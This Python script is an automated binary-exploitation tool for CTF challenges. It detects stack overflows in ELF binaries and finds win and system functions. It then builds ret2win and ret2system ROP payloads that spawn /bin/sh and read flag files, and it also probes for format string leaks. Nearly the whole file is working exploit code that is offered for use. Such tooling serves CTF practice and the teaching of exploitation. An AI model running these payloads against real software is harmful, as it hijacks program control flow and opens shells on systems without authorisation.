#!/usr/bin/env python3
"""auto_pwn_template -- Binary exploitation tool for CTF challenges.

Automates common pwn techniques:
  - checksec / protection analysis
  - Buffer overflow offset detection via cyclic patterns
  - Win function discovery
  - ret2win payload generation
  - ret2system payload generation
  - Format string vulnerability detection

Usage: python3 auto_pwn_template.py <binary> [--flag-format FORMAT]
Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import os
import re
import struct
import sys

# ---------------------------------------------------------------------------
# pwntools import -- graceful degradation if not installed
# ---------------------------------------------------------------------------
try:
    from pwn import (
        ELF,
        context,
        cyclic,
        cyclic_find,
        p64,
        p32,
        process,
        ROP,
    )

    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False

# ---------------------------------------------------------------------------
# Flag scanning
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")


def _scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text*."""
    flags: list[str] = []
    if flag_format:
        try:
            pat = re.compile(flag_format)
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    return flags


# ---------------------------------------------------------------------------
# 1. Check protections
# ---------------------------------------------------------------------------
def _check_protections(binary_path: str) -> dict:
    """Use pwntools ELF to print checksec info and return a summary dict."""
    print(f"[*] Checking protections for: {binary_path}")
    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as exc:
        print(f"[-] Failed to load ELF: {exc}")
        return {}

    info = {
        "arch": elf.arch,
        "bits": elf.bits,
        "nx": elf.nx,
        "pie": elf.pie,
        "canary": elf.canary,
        "relro": elf.relro if hasattr(elf, "relro") else "Unknown",
    }

    print(f"    Arch:   {info['arch']} ({info['bits']}-bit)")
    print(f"    NX:     {'Enabled' if info['nx'] else 'Disabled'}")
    print(f"    PIE:    {'Enabled' if info['pie'] else 'Disabled'}")
    print(f"    Canary: {'Enabled' if info['canary'] else 'Disabled'}")
    print(f"    RELRO:  {info['relro']}")
    return info


# ---------------------------------------------------------------------------
# 2. Detect overflow offset via cyclic pattern
# ---------------------------------------------------------------------------
def _detect_overflow_offset(binary_path: str) -> int | None:
    """Send a cyclic pattern to the binary and detect crash offset.

    Returns the offset (int) on success, or None if no crash / not detectable.
    """
    print("[*] Detecting buffer overflow offset with cyclic pattern ...")
    pattern_len = 512
    pattern = cyclic(pattern_len)

    try:
        proc = process(binary_path, level="error")
        proc.sendline(pattern)
        proc.wait(timeout=5)
    except Exception as exc:
        print(f"[-] Process error during offset detection: {exc}")
        try:
            proc.close()
        except Exception:
            pass
        return None

    # Try to read the crash address from the core / fault_addr
    try:
        fault = proc.corefile
        if fault is None:
            print("[-] No corefile produced -- cannot determine offset.")
            try:
                proc.close()
            except Exception:
                pass
            return None

        # Depending on arch, look at the instruction pointer or fault addr
        crash_addr = fault.fault_addr
        if crash_addr is None:
            crash_addr = fault.registers.get("pc") or fault.registers.get("rip") or fault.registers.get("eip")

        if crash_addr is None:
            print("[-] Could not extract crash address from corefile.")
            return None

        # Pack the address to bytes matching the pattern width (4 bytes for cyclic)
        try:
            crash_bytes = struct.pack("<I", crash_addr & 0xFFFFFFFF)
            offset = cyclic_find(crash_bytes)
        except Exception:
            offset = -1

        if offset == -1:
            print("[-] Crash address not found in cyclic pattern.")
            return None

        print(f"[+] Overflow offset found: {offset} bytes")
        return offset

    except Exception as exc:
        print(f"[-] Corefile analysis failed: {exc}")
        # Fallback: try reading process output for a segfault pattern
        return None
    finally:
        try:
            proc.close()
        except Exception:
            pass
        # Cleanup any core files
        for f in os.listdir("."):
            if f.startswith("core"):
                try:
                    os.remove(f)
                except OSError:
                    pass


# ---------------------------------------------------------------------------
# 3. Find win / useful functions
# ---------------------------------------------------------------------------
WIN_NAMES = [
    "system", "execve", "win", "flag", "get_flag", "print_flag",
    "shell", "backdoor", "secret", "give_shell", "read_flag",
    "cat_flag", "spawn_shell",
]


def _find_win_function(binary_path: str) -> dict[str, int]:
    """Search ELF symbols for interesting win / shell functions."""
    print("[*] Searching for win / shell functions ...")
    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as exc:
        print(f"[-] Failed to load ELF: {exc}")
        return {}

    found: dict[str, int] = {}
    all_symbols = dict(elf.symbols)
    # Also check plt entries
    if hasattr(elf, "plt"):
        for name, addr in elf.plt.items():
            if name not in all_symbols:
                all_symbols[name] = addr

    for name, addr in all_symbols.items():
        name_lower = name.lower()
        for win in WIN_NAMES:
            if win in name_lower:
                found[name] = addr
                print(f"    [+] {name} @ {hex(addr)}")
                break

    if not found:
        print("    [-] No obvious win functions found.")
    return found


# ---------------------------------------------------------------------------
# 4. ret2win payload
# ---------------------------------------------------------------------------
def _find_ret_gadget(binary_path: str) -> int | None:
    """Find a simple 'ret' gadget for stack alignment on x86-64."""
    try:
        elf = ELF(binary_path, checksec=False)
        rop = ROP(elf)
        ret = rop.find_gadget(["ret"])
        if ret:
            return ret.address
    except Exception:
        pass
    return None


def _generate_ret2win(
    binary_path: str,
    offset: int,
    target_addr: int,
    flag_format: str = "",
) -> str | None:
    """Build a ret2win payload and run the binary with it.

    Returns the extracted flag string if found, else None.
    """
    print(f"[*] Generating ret2win payload (offset={offset}, target={hex(target_addr)}) ...")

    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as exc:
        print(f"[-] ELF load failed: {exc}")
        return None

    bits = elf.bits
    pack = p64 if bits == 64 else p32

    # Build payload
    payload = b"A" * offset

    # On x86-64, insert a ret gadget for 16-byte stack alignment
    if bits == 64:
        ret_gadget = _find_ret_gadget(binary_path)
        if ret_gadget:
            print(f"    [+] Using ret gadget @ {hex(ret_gadget)} for stack alignment")
            payload += pack(ret_gadget)

    payload += pack(target_addr)

    print(f"    Payload length: {len(payload)} bytes")

    try:
        proc = process(binary_path, level="error")
        proc.sendline(payload)
        output = b""
        try:
            output = proc.recvall(timeout=5)
        except Exception:
            try:
                output = proc.recv(timeout=3)
            except Exception:
                pass
        proc.close()
    except Exception as exc:
        print(f"[-] Process error during ret2win: {exc}")
        return None

    text = output.decode("utf-8", errors="replace")
    print(f"[*] Binary output ({len(text)} chars):")
    for line in text.splitlines()[:20]:
        print(f"    | {line}")

    flags = _scan_flags(text, flag_format)
    if flags:
        return max(flags, key=len)
    return None


# ---------------------------------------------------------------------------
# 5. Format string detection
# ---------------------------------------------------------------------------
def _detect_format_string(binary_path: str) -> bool:
    """Send %p format specifiers and check if the binary leaks addresses."""
    print("[*] Testing for format string vulnerability ...")
    probe = b"%p.%p.%p.%p"
    try:
        proc = process(binary_path, level="error")
        proc.sendline(probe)
        output = b""
        try:
            output = proc.recvall(timeout=5)
        except Exception:
            try:
                output = proc.recv(timeout=3)
            except Exception:
                pass
        proc.close()
    except Exception as exc:
        print(f"[-] Process error during format string test: {exc}")
        return False

    text = output.decode("utf-8", errors="replace")
    hex_leak = re.findall(r"0x[0-9a-fA-F]+", text)
    if len(hex_leak) >= 2:
        print(f"    [+] FORMAT STRING DETECTED -- leaked {len(hex_leak)} addresses")
        for addr in hex_leak[:8]:
            print(f"        {addr}")
        return True

    print("    [-] No format string vulnerability detected.")
    return False


# ---------------------------------------------------------------------------
# 6. ret2system payload
# ---------------------------------------------------------------------------
def _generate_ret2system(
    binary_path: str,
    offset: int,
    flag_format: str = "",
) -> str | None:
    """If system@plt and '/bin/sh' are available, build a ret2system payload.

    Returns the extracted flag string if found, else None.
    """
    print("[*] Attempting ret2system exploit ...")

    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as exc:
        print(f"[-] ELF load failed: {exc}")
        return None

    # Locate system
    system_addr = None
    if "system" in elf.plt:
        system_addr = elf.plt["system"]
    elif "system" in elf.symbols:
        system_addr = elf.symbols["system"]

    if system_addr is None:
        print("    [-] system() not found in PLT or symbols.")
        return None
    print(f"    [+] system @ {hex(system_addr)}")

    # Locate /bin/sh string
    sh_addr = None
    try:
        sh_addr = next(elf.search(b"/bin/sh"))
    except StopIteration:
        pass

    if sh_addr is None:
        print("    [-] '/bin/sh' string not found in binary.")
        return None
    print(f"    [+] '/bin/sh' @ {hex(sh_addr)}")

    bits = elf.bits
    pack = p64 if bits == 64 else p32

    payload = b"A" * offset

    if bits == 64:
        # x86-64 calling convention: rdi = first argument
        # Need a pop rdi; ret gadget
        try:
            rop = ROP(elf)
            pop_rdi = rop.find_gadget(["pop rdi", "ret"])
            if pop_rdi is None:
                print("    [-] Could not find 'pop rdi; ret' gadget.")
                return None
            pop_rdi_addr = pop_rdi.address
        except Exception as exc:
            print(f"    [-] ROP gadget search failed: {exc}")
            return None

        # ret gadget for stack alignment
        ret_gadget = _find_ret_gadget(binary_path)
        if ret_gadget:
            payload += pack(ret_gadget)

        payload += pack(pop_rdi_addr)
        payload += pack(sh_addr)
        payload += pack(system_addr)
    else:
        # x86-32: system(arg) via stack
        payload += pack(system_addr)
        payload += pack(0xDEADBEEF)  # return address (don't care)
        payload += pack(sh_addr)

    print(f"    Payload length: {len(payload)} bytes")

    try:
        proc = process(binary_path, level="error")
        proc.sendline(payload)
        # For a shell, try sending a command to extract the flag
        try:
            proc.sendline(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo FLAG_SEARCH_DONE")
            output = proc.recvall(timeout=5)
        except Exception:
            try:
                output = proc.recv(timeout=3)
            except Exception:
                output = b""
        proc.close()
    except Exception as exc:
        print(f"[-] Process error during ret2system: {exc}")
        return None

    text = output.decode("utf-8", errors="replace")
    print(f"[*] Binary output ({len(text)} chars):")
    for line in text.splitlines()[:20]:
        print(f"    | {line}")

    flags = _scan_flags(text, flag_format)
    if flags:
        return max(flags, key=len)
    return None


# ---------------------------------------------------------------------------
# Main orchestration
# ---------------------------------------------------------------------------
def solve(binary_path: str, flag_format: str = "") -> bool:
    """Run the full pwn analysis pipeline on *binary_path*.

    Returns True if a flag was extracted.
    """
    if not os.path.isfile(binary_path):
        print(f"[-] Binary not found: {binary_path}")
        return False

    # Make sure it is executable
    if not os.access(binary_path, os.X_OK):
        try:
            os.chmod(binary_path, 0o755)
        except OSError:
            pass

    # Suppress pwntools noise
    context.log_level = "error"
    try:
        context.binary = binary_path
    except Exception:
        pass

    collected_flags: list[str] = []

    # --- Step 1: Protection check ---
    protections = _check_protections(binary_path)
    if not protections:
        print("[-] Could not load binary -- aborting.")
        return False

    is_pie = protections.get("pie", False)
    has_canary = protections.get("canary", False)

    if is_pie:
        print("[!] PIE is enabled -- static addresses won't work without a leak.")
    if has_canary:
        print("[!] Stack canary detected -- simple overflow may not work.")

    # --- Step 2: Find win functions ---
    win_funcs = _find_win_function(binary_path)

    # --- Step 3: Detect overflow offset ---
    offset = None
    if not has_canary:
        offset = _detect_overflow_offset(binary_path)
    else:
        print("[*] Skipping cyclic offset detection (canary present).")

    # --- Step 4: ret2win if offset + win function ---
    if offset is not None and win_funcs and not is_pie:
        # Prefer dedicated win/flag functions over system/execve
        priority = ["win", "flag", "get_flag", "print_flag", "cat_flag",
                     "read_flag", "backdoor", "secret", "give_shell",
                     "spawn_shell", "shell"]
        targets = []
        for pname in priority:
            for fname, addr in win_funcs.items():
                if pname in fname.lower() and (fname, addr) not in targets:
                    targets.append((fname, addr))
        # Append any remaining
        for fname, addr in win_funcs.items():
            if (fname, addr) not in targets:
                targets.append((fname, addr))

        for fname, addr in targets:
            print(f"\n[*] Trying ret2win → {fname} @ {hex(addr)}")
            flag = _generate_ret2win(binary_path, offset, addr, flag_format)
            if flag:
                collected_flags.append(flag)
                break

    # --- Step 5: ret2system if offset + system available ---
    if offset is not None and not is_pie and not collected_flags:
        flag = _generate_ret2system(binary_path, offset, flag_format)
        if flag:
            collected_flags.append(flag)

    # --- Step 6: Format string detection ---
    has_fmtstr = _detect_format_string(binary_path)
    if has_fmtstr and not collected_flags:
        print("[*] Format string vulnerability found but auto-exploitation not implemented.")
        print("[*] Manual exploitation may be needed (e.g., GOT overwrite, stack reads).")

    # --- Final: report ---
    if collected_flags:
        best = max(collected_flags, key=len)
        print(f"\nEXTRACTED FLAG: {best}")
        return True

    print("\n[-] No flag extracted. Summary of findings:")
    print(f"    Offset:        {offset if offset is not None else 'Not found'}")
    print(f"    Win functions:  {len(win_funcs)}")
    print(f"    Format string: {'Yes' if has_fmtstr else 'No'}")
    print(f"    PIE:           {'Yes' if is_pie else 'No'}")
    print(f"    Canary:        {'Yes' if has_canary else 'No'}")
    return False


def main():
    if not PWNTOOLS_AVAILABLE:
        print("[-] FATAL: pwntools is not installed. Install with: pip install pwntools", file=sys.stderr)
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="Kraken Pwn Template -- automated binary exploitation",
    )
    parser.add_argument("binary", help="Path to the target ELF binary")
    parser.add_argument(
        "--flag-format",
        default="",
        help="Regex for expected flag format (default: generic CTF pattern)",
    )
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)
    success = solve(binary_path, args.flag_format)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
